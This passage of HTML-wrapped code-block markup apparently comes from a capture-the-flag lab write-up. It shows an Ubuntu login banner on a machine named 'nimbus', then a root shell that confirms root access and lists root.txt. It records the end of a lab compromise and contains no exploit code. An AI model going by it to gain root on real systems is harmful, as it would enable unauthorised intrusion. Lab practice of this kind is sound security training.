+<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="w"> </span>*<span class="w"> </span>Support:<span class="w">        </span>https://ubuntu.com/pro
+<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a>
+<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="w"> </span>System<span class="w"> </span>information<span class="w"> </span>as<span class="w"> </span>of<span class="w"> </span>Thu<span class="w"> </span>Jun<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">08</span>:41:32<span class="w"> </span>PM<span class="w"> </span>UTC<span class="w"> </span><span class="m">2026</span>
+<a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a>
+<a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="w">  </span>System<span class="w"> </span>load:<span class="w">           </span><span class="m">0</span>.16
+<a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a><span class="w">  </span>Usage<span class="w"> </span>of<span class="w"> </span>/:<span class="w">            </span><span class="m">66</span>.4%<span class="w"> </span>of<span class="w"> </span><span class="m">9</span>.43GB
+<a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a><span class="w">  </span>Memory<span class="w"> </span>usage:<span class="w">          </span><span class="m">15</span>%
+<a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a><span class="w">  </span>Swap<span class="w"> </span>usage:<span class="w">            </span><span class="m">0</span>%
+<a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a><span class="w">  </span>Processes:<span class="w">             </span><span class="m">235</span>
+<a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a><span class="w">  </span>Users<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span>:<span class="w">       </span><span class="m">0</span>
+<a id="__codelineno-38-21" name="__codelineno-38-21" href="#__codelineno-38-21"></a><span class="w">  </span>IPv4<span class="w"> </span>address<span class="w"> </span><span class="k">for</span><span class="w"> </span>eth0:<span class="w"> </span><span class="m">10</span>.129.33.139
+<a id="__codelineno-38-22" name="__codelineno-38-22" href="#__codelineno-38-22"></a><span class="w">  </span>IPv6<span class="w"> </span>address<span class="w"> </span><span class="k">for</span><span class="w"> </span>eth0:<span class="w"> </span>dead:beef::a0de:adff:fe5e:ae17
+<a id="__codelineno-38-23" name="__codelineno-38-23" href="#__codelineno-38-23"></a>
+<a id="__codelineno-38-24" name="__codelineno-38-24" href="#__codelineno-38-24"></a>
+<a id="__codelineno-38-25" name="__codelineno-38-25" href="#__codelineno-38-25"></a>Expanded<span class="w"> </span>Security<span class="w"> </span>Maintenance<span class="w"> </span><span class="k">for</span><span class="w"> </span>Applications<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>enabled.
+<a id="__codelineno-38-26" name="__codelineno-38-26" href="#__codelineno-38-26"></a>
+<a id="__codelineno-38-27" name="__codelineno-38-27" href="#__codelineno-38-27"></a><span class="m">0</span><span class="w"> </span>updates<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>applied<span class="w"> </span>immediately.
+<a id="__codelineno-38-28" name="__codelineno-38-28" href="#__codelineno-38-28"></a>
+<a id="__codelineno-38-29" name="__codelineno-38-29" href="#__codelineno-38-29"></a><span class="m">4</span><span class="w"> </span>additional<span class="w"> </span>security<span class="w"> </span>updates<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>applied<span class="w"> </span>with<span class="w"> </span>ESM<span class="w"> </span>Apps.
+<a id="__codelineno-38-30" name="__codelineno-38-30" href="#__codelineno-38-30"></a>Learn<span class="w"> </span>more<span class="w"> </span>about<span class="w"> </span>enabling<span class="w"> </span>ESM<span class="w"> </span>Apps<span class="w"> </span>service<span class="w"> </span>at<span class="w"> </span>https://ubuntu.com/esm
+<a id="__codelineno-38-31" name="__codelineno-38-31" href="#__codelineno-38-31"></a>
+<a id="__codelineno-38-32" name="__codelineno-38-32" href="#__codelineno-38-32"></a>
+<a id="__codelineno-38-33" name="__codelineno-38-33" href="#__codelineno-38-33"></a>The<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>available<span class="w"> </span>updates<span class="w"> </span>is<span class="w"> </span>more<span class="w"> </span>than<span class="w"> </span>a<span class="w"> </span>week<span class="w"> </span>old.
+<a id="__codelineno-38-34" name="__codelineno-38-34" href="#__codelineno-38-34"></a>To<span class="w"> </span>check<span class="w"> </span><span class="k">for</span><span class="w"> </span>new<span class="w"> </span>updates<span class="w"> </span>run:<span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>update
+<a id="__codelineno-38-35" name="__codelineno-38-35" href="#__codelineno-38-35"></a>Last<span class="w"> </span>login:<span class="w"> </span>Thu<span class="w"> </span>Jun<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">20</span>:41:33<span class="w"> </span><span class="m">2026</span><span class="w"> </span>from<span class="w"> </span>&lt;tu_ip&gt;
+<a id="__codelineno-38-36" name="__codelineno-38-36" href="#__codelineno-38-36"></a>root@nimbus:~#<span class="w"> </span>whoami
+<a id="__codelineno-38-37" name="__codelineno-38-37" href="#__codelineno-38-37"></a>root
+<a id="__codelineno-38-38" name="__codelineno-38-38" href="#__codelineno-38-38"></a>root@nimbus:~#<span class="w"> </span>ls<span class="w"> </span>/root<span class="w">                                                                                                                </span>
+<a id="__codelineno-38-39" name="__codelineno-38-39" href="#__codelineno-38-39"></a>root.txt
+</code></pre></div>
 
 
 
